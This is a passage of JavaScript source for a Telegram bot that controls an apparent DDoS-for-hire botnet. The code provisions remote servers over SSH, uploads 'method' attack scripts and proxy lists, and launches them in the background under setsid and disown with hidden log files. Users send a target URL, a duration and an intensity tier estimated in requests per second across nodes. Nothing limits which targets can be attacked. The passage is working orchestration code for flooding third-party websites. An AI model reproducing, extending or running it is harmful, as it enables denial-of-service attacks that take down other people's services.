        'export DEBIAN_FRONTEND=noninteractive',
        'echo "===[provision] start==="',
      ];

      if (pm.includes('apt')) {
        script.push(
          'apt-get update -y',
          'apt-get install -y curl ca-certificates build-essential gnupg || true',
          'curl -fsSL https://deb.nodesource.com/setup_20.x | bash -',
          'apt-get install -y nodejs',
        );
      } else if (pm.includes('yum')) {
        script.push(
          'yum install -y curl ca-certificates gcc-c++ make || true',
          'curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -',
          'yum install -y nodejs',
        );
      } else if (pm.includes('apk')) {
        script.push('apk add --no-cache nodejs npm bash curl ca-certificates');
      } else {
        script.push(
          'ARCH=$(uname -m)',
          'case "$ARCH" in x86_64) NODE_ARCH=x64;; aarch64) NODE_ARCH=arm64;; *) NODE_ARCH=x64;; esac',
          'NODE_VER=20.18.0',
          'cd /tmp',
          'curl -fsSL "https://nodejs.org/dist/v${NODE_VER}/node-v${NODE_VER}-linux-${NODE_ARCH}.tar.xz" -o node.tar.xz',
          'tar -xJf node.tar.xz',
          'cp -r node-v${NODE_VER}-linux-${NODE_ARCH}/* /usr/local/',
          'ln -sf /usr/local/bin/node /usr/bin/node || true',
          'ln -sf /usr/local/bin/npm /usr/bin/npm || true',
          'rm -rf /tmp/node.tar.xz /tmp/node-v${NODE_VER}-linux-${NODE_ARCH}',
        );
      }

      script.push(
        'mkdir -p /root/attack',
        'echo "===[provision] done==="',
        'bash -lc "command -v node; node -v" || true',
      );

      const r = await sshExec(conn, script.join('\n'), CONFIG.PROVISION_TIMEOUT);
      const combined = (r.out || '') + '\n' + (r.err || '');
      if (!combined.includes('[provision] done')) throw new Error('provision failed: ' + combined.slice(-250));

      env = await collectRemoteEnv(serverId, conn);
      if (!env.nodePath) throw new Error('provision succeeded but node still not found');
      say(`✅ installed node ${env.version}`);
    }

    say('📦 checking deps…');
    try {
      const deps = await ensureDepsOnRemote(conn, serverId, env, say);
      if (deps.installed) say(`✅ deps installed`);
      else say('✅ deps already present');
    } catch (e) {
      say('⚠️ deps: ' + e.message.slice(0, 100));
    }

    return env;
  } finally {
    provisioningSet.delete(serverId);
  }
}

async function collectRemoteEnv(serverId, conn) {
  const finder = [
    'set +e',
    'for p in "$(command -v node 2>/dev/null)" /usr/local/bin/node /usr/bin/node /opt/node/bin/node /root/.nvm/versions/node/*/bin/node; do',
    '  if [ -x "$p" ] && "$p" -v >/dev/null 2>&1; then echo "NODE:$p"; break; fi',
    'done',
    'echo "CORES:$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo)"',
    'echo "MEM_KB:$(awk \'/MemTotal/ {print $2}\' /proc/meminfo 2>/dev/null)"',
    'echo "ARCH:$(uname -m)"',
    'echo "DISK_AVAIL:$(df -BG / 2>/dev/null | tail -1 | awk \'{print $4}\' | tr -d G)"',
  ].join('\n');

  const r = await sshExec(conn, `bash -lc ${shellQuote(finder)}`, 12000);
  const out = r.out || '';

  const nodeMatch = out.match(/NODE:(\S+)/);
  const coresMatch = out.match(/CORES:(\d+)/);
  const memMatch = out.match(/MEM_KB:(\d+)/);
  const archMatch = out.match(/ARCH:(\S+)/);
  const diskMatch = out.match(/DISK_AVAIL:(\d+)/);

  const nodePath = nodeMatch ? nodeMatch[1] : null;
  let version = null;
  if (nodePath) {
    const verR = await sshExec(conn, `${shellQuote(nodePath)} -v`, 5000);
    version = (verR.out || '').trim().replace(/^v/, '') || null;
  }

  const cores = coresMatch ? parseInt(coresMatch[1], 10) : 0;
  const memMB = memMatch ? Math.round(parseInt(memMatch[1], 10) / 1024) : 0;
  const arch = archMatch ? archMatch[1] : '?';
  const diskGB = diskMatch ? parseInt(diskMatch[1], 10) : 0;

  const env = { nodePath, version, cores, memMB, arch, diskGB, at: Date.now() };
  if (nodePath) remoteEnvCache.set(serverId, env);
  return env;
}

async function getRemoteEnv(serverId, conn) {
  const cached = remoteEnvCache.get(serverId);
  if (cached && cached.nodePath && Date.now() - cached.at < CONFIG.REMOTE_ENV_TTL) return cached;
  return collectRemoteEnv(serverId, conn);
}

async function ensureRemoteReady(serverId, conn, onProgress) {
  let env = null;
  try { env = await collectRemoteEnv(serverId, conn); } catch {}
  if (env && env.nodePath) return env;
  if (!CONFIG.AUTO_PROVISION) throw new Error('node not installed on remote (auto-provision disabled)');
  return provisionRemote(serverId, conn, onProgress);
}

async function ensureDepsOnRemote(conn, serverId, env, onProgress) {
  if (!REMOTE_DEPS.length) return { installed: false };
  const say = (msg) => { try { onProgress && onProgress(msg); } catch {} };

  const cached = remoteDepsCache.get(serverId);
  if (cached && cached.ok && Date.now() - cached.at < CONFIG.REMOTE_ENV_TTL) {
    return { installed: false, cached: true };
  }

  const checkScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} 2>/dev/null || { echo "DEPS_NO_DIR"; exit 0; }`,
    `NODE_BIN=${shellQuote(env.nodePath)}`,
    'MISSING=""',
    `for m in ${REMOTE_DEPS.map(d => shellQuote(d.replace(/@.*$/, ''))).join(' ')}; do`,
    '  if ! "$NODE_BIN" -e "require.resolve(\'$m\')" >/dev/null 2>&1; then MISSING="$MISSING $m"; fi',
    'done',
    'if [ -z "$MISSING" ]; then echo "DEPS_OK"; else echo "DEPS_MISSING:$MISSING"; fi',
  ].join('\n');

  const check = await sshExec(conn, checkScript, 15000);
  const out = (check.out || '').trim();

  if (out.includes('DEPS_OK')) {
    remoteDepsCache.set(serverId, { ok: true, at: Date.now() });
    return { installed: false };
  }

  const missing = ((out.match(/DEPS_MISSING:(.*)/) || [])[1] || REMOTE_DEPS.join(' ')).trim();
  say(`📦 installing missing deps: ${missing}`);

  const npmCheck = await sshExec(conn,
    `bash -lc 'command -v npm 2>/dev/null || echo "${env.nodePath.replace(/\/node$/, '/npm')}"'`,
    8000
  );
  const npmPath = (npmCheck.out || '').trim().split('\n')[0] || 'npm';

  const installScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} || { echo "NPM_CD_FAIL"; exit 1; }`,
    `[ -f package.json ] || echo '{"name":"remote-attack","private":true,"version":"1.0.0"}' > package.json`,
    `setsid ${shellQuote(npmPath)} install ${REMOTE_DEPS.map(shellQuote).join(' ')} --no-audit --no-fund --silent < /dev/null > /tmp/deps_install.log 2>&1 &`,
    'NPM_PID=$!',
    'echo "NPM_PID:$NPM_PID"',
    'WAITED=0',
    'while kill -0 $NPM_PID 2>/dev/null && [ $WAITED -lt 90 ]; do sleep 2; WAITED=$((WAITED+1)); done',
    'if kill -0 $NPM_PID 2>/dev/null; then echo "NPM_TIMEOUT"; kill -9 $NPM_PID 2>/dev/null; exit 2; fi',
    'wait $NPM_PID',
    'echo "NPM_RC:$?"',
    'echo "--- npm log tail ---"',
    'tail -12 /tmp/deps_install.log 2>/dev/null',
    'echo "--- dep require check ---"',
    `NODE_BIN=${shellQuote(env.nodePath)}`,
    `for m in ${REMOTE_DEPS.map(d => shellQuote(d.replace(/@.*$/, ''))).join(' ')}; do`,
    '  if "$NODE_BIN" -e "require.resolve(\'$m\')" >/dev/null 2>&1; then echo "OK:$m"; else echo "FAIL:$m"; fi',
    'done',
  ].join('\n');

  const install = await sshExec(conn, installScript, CONFIG.DEPS_INSTALL_TIMEOUT);
  const result = (install.out || '');

  const failed = (result.match(/FAIL:(\S+)/g) || []).map(s => s.replace('FAIL:', ''));
  if (failed.length) {
    const logTail = (result.match(/--- npm log tail ---\n([\s\S]*?)\n--- dep require check ---/) || [])[1] || '';
    remoteDepsCache.set(serverId, { ok: false, missing: failed.join(','), at: Date.now() });
    throw new Error(`deps install failed (${failed.join(',')}): ${logTail.slice(-300) || result.slice(-200)}`);
  }

  remoteDepsCache.set(serverId, { ok: true, at: Date.now() });
  return { installed: true, missing };
}

async function ensureMethodOnRemote(conn, serverId, fileName) {
  const localPath = path.join(CONFIG.SCRIPT_DIR, fileName);
  if (!fs.existsSync(localPath)) throw new Error(`local missing: ${fileName}`);

  const localHash = crypto.createHash('sha1').update(fs.readFileSync(localPath)).digest('hex');

  await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);

  const remoteHashR = await sshExec(
    conn,
    `sha1sum ${shellQuote(CONFIG.REMOTE_DIR + '/' + fileName)} 2>/dev/null | awk '{print $1}'`,
    6000
  );
  const remoteHash = (remoteHashR.out || '').trim();
  const cacheKey = `${serverId}:${fileName}`;

  if (remoteHash === localHash && remoteHashCache.get(cacheKey) === localHash) {
    return { uploaded: false, hash: localHash };
  }

  await sshUpload(conn, localPath, `${CONFIG.REMOTE_DIR}/${fileName}`);
  remoteHashCache.set(cacheKey, localHash);

  const proxyPath = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
  if (fs.existsSync(proxyPath)) {
    try { await sshUpload(conn, proxyPath, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`); } catch {}
  }

  return { uploaded: true, hash: localHash };
}

async function prewarmServers(ids) {
  const toWarm = ids.filter(id => !serverConns.has(id) && !warmupSet.has(id));
  toWarm.forEach(id => warmupSet.add(id));
  await Promise.allSettled(toWarm.map(async id => {
    try { await getServerConn(id); } catch {}
    warmupSet.delete(id);
  }));
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (cached && cached._inflight) return cached;
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;
  healthCache.set(id, { ...(cached || {}), _inflight: true, at: cached?.at || 0 });
  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    let env = null;
    try { env = await collectRemoteEnv(id, conn); } catch {}
    const result = { online, load, env, at: Date.now(), _inflight: false };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now(), _inflight: false };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

async function syncMethodToServer(serverId, methodFile = null) {
  const conn = await getServerConn(serverId);
  await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
  const out = { method: false, proxy: false, deps: false };
  const files = methodFile ? [methodFile] : [...new Set([...allMethods().map(m => m.file), CONFIG.PROXY_FILE])];
  for (const file of files) {
    const local = path.join(CONFIG.SCRIPT_DIR, file);
    if (!fs.existsSync(local)) continue;
    try {
      if (file === CONFIG.PROXY_FILE) {
        await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${file}`);
        out.proxy = true;
      } else {
        await ensureMethodOnRemote(conn, serverId, file);
        out.method = true;
      }
    } catch {}
  }
  try {
    const env = remoteEnvCache.get(serverId) || await collectRemoteEnv(serverId, conn);
    if (env?.nodePath) {
      await ensureDepsOnRemote(conn, serverId, env);
      out.deps = true;
    }
  } catch {}
  return out;
}

/* ══════════════════════════════════════════════════════════════════════════
   ATTACK ENGINE — takes parsed object (not raw args)
   ══════════════════════════════════════════════════════════════════════════ */

const ATTACKS = new EventEmitter();
const newSessionId = () => 'sess_' + crypto.randomBytes(4).toString('hex');
const newBatchId = () => 'batch_' + crypto.randomBytes(4).toString('hex');

function persistSession(session) {
  const s = { ...session };
  delete s.child; delete s.timer; delete s.logStream;
  store.sessions.mutate(all => { all[session.id] = s; });
}

function launchLocal(user, method, parsed, batchId) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);
  const child = spawn(process.execPath, [methodPath, ...parsed.args], {
    cwd: CONFIG.SCRIPT_DIR, detached: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });
  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: parsed.target, duration: Number(parsed.duration) || 0,
    startedAt: Date.now(), status: 'running', where: 'local', pid: child.pid, logs: '',
  };
  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-4000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-4000); });
  child.on('exit', () => { session.status = 'done'; persistSession(session); });
  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  persistSession(session);
  return session;
}

async function launchRemoteOnce(user, method, parsed, serverId, batchId, onProgress) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);
  const conn = await getServerConn(serverId);

  const env = await ensureRemoteReady(serverId, conn, onProgress);
  await ensureMethodOnRemote(conn, serverId, method.file);

  try {
    await ensureDepsOnRemote(conn, serverId, env, onProgress);
  } catch (e) {
    if (onProgress) onProgress('⚠️ deps: ' + e.message.slice(0, 80));
  }

  const id = newSessionId();
  const logFile = `/tmp/.atk_${id}.log`;
  const quotedArgs = parsed.args.map(shellQuote).join(' ');
  const nodeBin = env.nodePath;

  const launchScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} || { echo "LAUNCH_ERR:cd_failed"; exit 1; }`,
    `rm -f ${shellQuote(logFile)}`,
    `setsid ${shellQuote(nodeBin)} ${shellQuote(method.file)} ${quotedArgs} < /dev/null > ${shellQuote(logFile)} 2>&1 &`,
    `PID=$!`,
    `disown $PID 2>/dev/null || true`,
    `echo "LAUNCHED:$PID"`,
  ].join('\n');

  const r = await safeRemoteExec(conn, launchScript.split('\n'), CONFIG.ATTACK_TIMEOUT);
  const out = r.out || '';
  const launchedMatch = out.match(/LAUNCHED:(\d+)/);
  let remotePid = launchedMatch ? parseInt(launchedMatch[1], 10) : 0;

  if (!remotePid) {
    const pg = await sshExec(conn, `pgrep -f ${shellQuote(nodeBin + ' ' + method.file)} | head -1`, 8000);
    remotePid = parseInt((pg.out || '').trim().replace(/[^0-9]/g, ''), 10);
  }

  if (!remotePid || isNaN(remotePid)) {
    const tail = await sshExec(conn, `tail -30 ${shellQuote(logFile)} 2>/dev/null || echo "no log"`, 6000);
    const snippet = (tail.out || r.err || '').trim().slice(0, 300) || 'no pid returned';
    throw new Error(`${server.name}: launch failed — ${snippet}`);
  }

  await new Promise(r => setTimeout(r, CONFIG.REMOTE_STABILIZE_MS));

  const alive = await sshExec(conn, `kill -0 ${remotePid} 2>/dev/null && echo ALIVE || echo DEAD`, 5000);
  if (!alive.out.includes('ALIVE')) {
    const tail = await sshExec(conn, `tail -30 ${shellQuote(logFile)} 2>/dev/null || echo "no log"`, 6000);
    const snippet = (tail.out || '').trim().slice(0, 400) || 'no log content';
    throw new Error(`${server.name}: died immediately — ${snippet}`);
  }

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: parsed.target, duration: Number(parsed.duration) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logFile, logs: '', nodeBin,
  };
  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  persistSession(session);
  return session;
}

async function launchRemote(user, method, parsed, serverId, batchId, onProgress) {
  let lastErr;
  for (let attempt = 0; attempt <= CONFIG.REMOTE_RETRY; attempt++) {
    try {
      return await launchRemoteOnce(user, method, parsed, serverId, batchId, onProgress);
    } catch (e) {
      lastErr = e;
      remoteEnvCache.delete(serverId);
      remoteDepsCache.delete(serverId);
      if (attempt < CONFIG.REMOTE_RETRY) await new Promise(r => setTimeout(r, 500));
    }
  }
  throw lastErr;
}

function stopSession(id, reason = 'manual') {
  const live = store.sessions.get()[id];
  if (!live || live.status !== 'running') return false;
  if (live.where === 'local' && live.pid) {
    try { process.kill(-live.pid, 'SIGKILL'); } catch { try { process.kill(live.pid, 'SIGKILL'); } catch {} }
  } else if (live.where === 'remote' && live.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(live.serverId);
        await sshExec(conn,
          `kill -9 ${live.remotePid} 2>/dev/null; pkill -9 -P ${live.remotePid} 2>/dev/null || true`,
          CONFIG.REMOTE_KILL_GRACE_MS
        );
      } catch {}
    })();
  }
  store.sessions.mutate(all => {
    if (all[id]) { all[id].status = 'stopped'; all[id].stoppedAt = Date.now(); all[id].stopReason = reason; }
  });
  audit('attack_stopped', live.owner, { id, reason });
  ATTACKS.emit('stopped', id);
  if (live.batchId) {
    const still = Object.values(store.sessions.get()).filter(s => s.batchId === live.batchId && s.status === 'running');
    if (still.length === 0) ATTACKS.emit('batch_done', live.batchId);
  }
  return true;
}

function stopAllSessions(ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of Object.entries(store.sessions.get())) {
    if (s.status !== 'running') continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'killall')) killed++;
  }
  return killed;
}

async function tailSessionLog(id, n = 30) {
  const live = store.sessions.get()[id];
  if (!live) return '(session not found)';
  if (live.where === 'local') {
    return (live.logs || '(no log)').split('\n').slice(-n).join('\n') || '(empty)';
  }
  try {
    const conn = await getServerConn(live.serverId);
    const r = await sshExec(conn, `tail -${n} ${shellQuote(live.logFile)} 2>/dev/null || echo "(no log)"`, 8000);
    return (r.out || '(no log)').trim();
  } catch (e) { return `(error: ${e.message})`; }
}

class AttackQueue {
  constructor(perServerConcurrency) {
    this.perServer = perServerConcurrency;
    this.serverCounts = new Map();
    this.queue = [];
    this.running = 0;
    this.maxRunning = 100;
  }
  push(task) { this.queue.push(task); this._pump(); }
  _pump() {
    while (this.queue.length && this.running < this.maxRunning) {
      const idx = this.queue.findIndex(t => this._canRun(t));
      if (idx === -1) break;
      const [task] = this.queue.splice(idx, 1);
      this._run(task);
    }
  }
  _canRun(task) {
    if (task.kind !== 'remote') return true;
    return (this.serverCounts.get(task.serverId) || 0) < this.perServer;
  }
  async _run(task) {
    this.running++;
    if (task.kind === 'remote') this.serverCounts.set(task.serverId, (this.serverCounts.get(task.serverId) || 0) + 1);
    try { await task.fn(); }
    catch (e) { if (task.onError) task.onError(e); }
    finally {
      this.running--;
      if (task.kind === 'remote') this.serverCounts.set(task.serverId, (this.serverCounts.get(task.serverId) || 1) - 1);
      this._pump();
    }
  }
}
const attackQueue = new AttackQueue(CONFIG.MAX_CONCURRENT_PER_SERVER);

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') throw new Error('must be http:// or https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

/* ══════════════════════════════════════════════════════════════════════════
   BOT CORE
   ══════════════════════════════════════════════════════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, {
  polling: { interval: 1000, autoStart: true, params: { timeout: 30 } },
});

let pollingRestarts = 0;
function restartPolling(reason) {
  if (pollingRestarts >= CONFIG.MAX_POLLING_RESTARTS) { console.error('[polling] max — exit'); process.exit(1); }
  pollingRestarts++;
  const backoff = Math.min(30000, 1000 * Math.pow(2, Math.min(pollingRestarts, 5)));
  console.warn(`[polling] "${reason}" — restart #${pollingRestarts} in ${backoff}ms`);
  setTimeout(async () => {
    try { await bot.stopPolling({ cancel: true }); } catch {}
    try {
      await bot.deleteWebHook();
      await bot.startPolling({ restart: true });
      console.log(`[polling] restarted (attempt ${pollingRestarts})`);
      pollingRestarts = 0;
    } catch (e) { console.error('[polling] restart failed:', e.message); restartPolling(e.message); }
  }, backoff);
}

bot.on('polling_error', err => {
  const msg = String(err?.message || err);
  if (msg.includes('409')) { console.warn('[polling] 409 conflict'); return; }
  console.error('[polling_error]', msg);
  restartPolling(msg);
});

let lastUpdateAt = Date.now();
bot.on('message', () => { lastUpdateAt = Date.now(); });
bot.on('callback_query', () => { lastUpdateAt = Date.now(); });
setInterval(() => {
  const stale = Date.now() - lastUpdateAt;
  if (stale > CONFIG.HEARTBEAT_STALE_MS) {
    console.warn(`[heartbeat] stale ${Math.floor(stale / 1000)}s — restart`);
    lastUpdateAt = Date.now();
    restartPolling('stale-heartbeat');
  }
}, CONFIG.HEARTBEAT_CHECK_MS).unref();

setInterval(() => {
  const now = Date.now();
  for (const [k, v] of pendingInput) if (v.expires && v.expires < now) pendingInput.delete(k);
  for (const [k, v] of buckets) if (now - v.lastRefill > 600000) buckets.delete(k);
  for (const [k, v] of healthCache) if (now - v.at > 300000) healthCache.delete(k);
  for (const [k, v] of remoteEnvCache) if (now - v.at > CONFIG.REMOTE_ENV_TTL * 2) remoteEnvCache.delete(k);
  for (const [k, v] of remoteDepsCache) if (now - v.at > CONFIG.REMOTE_ENV_TTL * 2) remoteDepsCache.delete(k);
  for (const [k, v] of Object.entries(store.cooldowns.get())) {
    if (v.until < now) store.cooldowns.mutate(c => { delete c[k]; });
  }
}, 60000).unref();

setInterval(() => {
  const now = Date.now();
  store.sessions.mutate(all => {
    for (const [id, s] of Object.entries(all)) {
      if (s.status === 'running') continue;
      if (s.status === 'stale') {
        if (now - (s.staleAt || s.startedAt) > 3600000) delete all[id];
      } else {
        const endAt = s.stoppedAt || (s.startedAt + (s.duration || 0) * 1000);
        if (now - endAt > CONFIG.SESSION_GC_MS) delete all[id];
      }
    }
  });
}, 30000).unref();

/* ══════════════════════════════════════════════════════════════════════════
   REPLY / UI HELPERS
   ══════════════════════════════════════════════════════════════════════════ */

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML', disable_web_page_preview: true, ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function edit(chatId, messageId, text, opts = {}) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', disable_web_page_preview: true, ...opts }); } catch {}
}

async function answerCB(id, text, alert = false) {
  try { await bot.answerCallbackQuery(id, { text, show_alert: alert }); } catch {}
}

const btn = (text, cb, style = 'primary') => ({ text, callback_data: cb, style });

function paginate(items, page, perPage = 8) {
  const total = Math.ceil(items.length / perPage);
  const p = Math.max(1, Math.min(page, total || 1));
  return { slice: items.slice((p - 1) * perPage, p * perPage), page: p, total, hasNext: p < total, hasPrev: p > 1 };
}

function hardwareBadge(env) {
  if (!env) return '';
  const c = env.cores ? `${env.cores}c` : '?c';
  const m = env.memMB ? formatGB(env.memMB) : '?G';
  return `${c} · ${m}`;
}

function depsBadge(serverId) {
  const d = remoteDepsCache.get(serverId);
  if (!d) return '';
  return d.ok ? ' · 📦' : ' · ⚠️deps';
}

/* ══════════════════════════════════════════════════════════════════════════
   ATTACK FLOW — method first, then URL, then duration, then intensity
   ══════════════════════════════════════════════════════════════════════════ */

async function startAttackFlow(chatId, userId) {
  const user = getUser(userId) || { telegramId: userId };
  const methods = visibleMethodsFor(user);
  if (methods.length === 0) return bot.sendMessage(chatId, '📭 No methods available.');

  const kb = methods.map(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const icon = !m.enabled ? '🔴' : (ok ? m.emoji || '📦' : '❌');
    return [btn(`${icon} ${m.name}`, `pickm_${m.id}`, m.enabled && ok ? 'primary' : 'danger')];
  });
  kb.push([btn('❌ Cancel', 'int_cancel', 'danger')]);

  await bot.sendMessage(chatId,
    `💥 <b>New Attack</b>\n\n<b>Pick a method:</b>\n<i>${methods.length} available</i>`,
    { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function startQuickLaunch(chatId, user, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  if (!isMethodEnabled(m.id)) return reply({ chat: { id: chatId } }, '🔴 Disabled');
  if (!userCanUseMethod(user, m.id)) return reply({ chat: { id: chatId } }, '🔒 No access');
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file))) {
    return reply({ chat: { id: chatId } }, `❌ File <code>${esc(m.file)}</code> missing`);
  }

  pendingInput.set(user.telegramId, { action: 'quick_target', data: { methodId }, expires: Date.now() + 180000 });

  await bot.sendMessage(chatId,
    `${m.emoji} <b>${esc(m.name)}</b>\n\n` +
    `<b>Step 1/3</b> — Send the target URL:\n` +
    `<code>https://target.com</code>\n\n` +
    `<i>${esc(m.desc)}</i>\n\n` +
    `<i>/cancel to abort</i>`,
    { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
}

async function showIntensityMenu(chatId, userId, methodId, target, duration) {
  const method = getMethod(methodId);
  if (!method) return;
  const nodes = onlineNodeCount();
  const admin = isAdmin(userId);

  pendingInput.set(userId, {
    action: 'awaiting_intensity',
    data: { methodId, target, duration },
    expires: Date.now() + 300000,
  });

  const available = Object.entries(INTENSITY).filter(([, v]) => !v.adminOnly || admin).length;
  const lines = [
    `${method.emoji} <b>Attack Setup</b>`,
    ``,
    `📦 <b>${esc(method.name)}</b>`,
    `🎯 <code>${esc(target)}</code>`,
    `⏱ ${duration}s`,
    `📡 Nodes: <b>${nodes}</b> (1 local + ${nodes - 1} remote)`,
    ``,
    `<b>Choose intensity</b> (${available} available${admin ? '' : ' · 🔒 admin only'}):`,
    ``,
    `<i>RPS = threads × rate × ${nodes} nodes</i>`,
  ].join('\n');

  await bot.sendMessage(chatId, lines, {
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: intensityKeyboard(userId),
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   INTENSITY MENU
   ══════════════════════════════════════════════════════════════════════════ */

function intensityKeyboard(userId) {
  const admin = isAdmin(userId);
  const kb = [];
  for (const [key, val] of Object.entries(INTENSITY)) {
    if (val.adminOnly && !admin) continue;
    const rps = estimateRps(val.threads, val.rate);
    const adminTag = val.adminOnly ? ' 🔒' : '';
    kb.push([{
      text: `${val.emoji} ${val.label}${adminTag} · ${val.threads}T×${val.rate}R · ~${formatNum(rps)} RPS`,
      callback_data: `int_${key}`,
      style: key === 'nuke' ? 'danger' : (key === 'extreme' ? 'danger' : (key === 'heavy' ? 'success' : 'primary')),
    }]);
  }
  kb.push([btn('❌ Cancel', 'int_cancel', 'danger')]);
  return { inline_keyboard: kb };
}

/* ══════════════════════════════════════════════════════════════════════════
   MENUS
   ══════════════════════════════════════════════════════════════════════════ */

function mainMenu(userId) {
  const kb = [
    [btn('💥 New Attack', 'menu_attack', 'danger'), btn('📊 Status', 'menu_status', 'success')],
    [btn('📦 Methods', 'menu_methods', 'primary'), btn('📡 Servers', 'menu_servers', 'primary')],
    [btn('🕹 Sessions', 'menu_sessions', 'primary'), btn('📜 History', 'menu_history', 'primary')],
  ];
  if (isAdmin(userId)) kb.push([btn('👑 Admin Panel', 'menu_admin', 'danger')]);
  return { inline_keyboard: kb };
}

function methodMenu(methodId) {
  return {
    inline_keyboard: [
      [btn('💥 Start Attack', `quick_${methodId}`, 'danger')],
      [btn('⬅️ Back', 'menu_main', 'primary')],
    ],
  };
}

const backMenu = (label = '⬅️ Back', cb = 'menu_main') => ({ inline_keyboard: [[btn(label, cb, 'primary')]] });

function adminMenu(viewerId) {
  const kb = [
    [btn('👥 Users', 'adm_users', 'primary'), btn('🖥 Servers', 'adm_servers', 'primary')],
    [btn('📦 Methods', 'adm_methods', 'primary'), btn('🎯 Presets', 'adm_presets', 'success')],
    [btn('🌐 Proxies', 'adm_proxies', 'primary'), btn('🚫 Blacklist', 'adm_blacklist', 'danger')],
    [btn('🤖 Bot Control', 'adm_botcontrol', 'primary'), btn('📊 Stats', 'adm_stats', 'success')],
    [btn('📜 Audit', 'adm_audit', 'primary'), btn('📢 Broadcast', 'adm_broadcast', 'primary')],
    [btn('🔄 Refresh', 'adm_refresh', 'primary'), btn('💀 Kill All', 'adm_killall', 'danger')],
  ];
  if (isOwner(viewerId)) kb.push([btn('👑 Manage Admins', 'adm_manage', 'success')]);
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  return { inline_keyboard: kb };
}

/* ══════════════════════════════════════════════════════════════════════════
   VIEWS
   ══════════════════════════════════════════════════════════════════════════ */

async function showMainMenu(chatId, editMsgId, userId) {
  const s = serverStats();
  const user = getUser(userId) || {};
  const online = botIsOnline();
  const stateLabel = online ? '🟢 ONLINE' : '🔴 MAINTENANCE';
  const methods = availableMethods().filter(m => m.enabled);
  const txt = [
    `⚫ <b>${BRAND}</b> <i>${VERSION}</i> ⚫`,
    ``,
    `🏛 Status: <b>${stateLabel}</b>`,
    `👤 Role: <b>${roleLabel(user)}</b> ${roleBadge(user)}`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online · ⚔️ <b>${s.attacking}</b> attacking`,
    `📦 Methods: <b>${methods.length}</b> active (${methods.map(m => m.emoji).join(' ')})`,
    user.lastMethod ? `\n🔁 Last: <code>${esc(user.lastMethod)}</code>${user.lastTarget ? ` → <code>${esc(String(user.lastTarget).slice(0, 40))}</code>` : ''}` : '',
    ``,
    `<i>/attack for direct · /help for commands</i>`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: mainMenu(userId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: mainMenu(userId) });
}

async function showMethodDetail(chatId, editMsgId, methodId, viewerId) {
  const m = getMethod(methodId);
  if (!m) return;
  const hist = store.history.get().filter(h => h.method === methodId);
  const admin = isAdmin(viewerId || 0);
  const available = Object.entries(INTENSITY).filter(([, v]) => !v.adminOnly || admin);
  const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b> ${fileExists ? '' : '❌'}`,
    m.enabled ? '' : '<i>🔴 DISABLED</i>',
    ``,
    `📝 <i>${m.desc}</i>`,
    ``,
    `<b>File:</b> <code>${esc(m.file)}</code>`,
    `<b>Usage:</b>`,
    `<code>${esc(m.example)}</code>`,
    ``,
    `📈 Launches: <b>${m.stats?.launches || 0}</b>`,
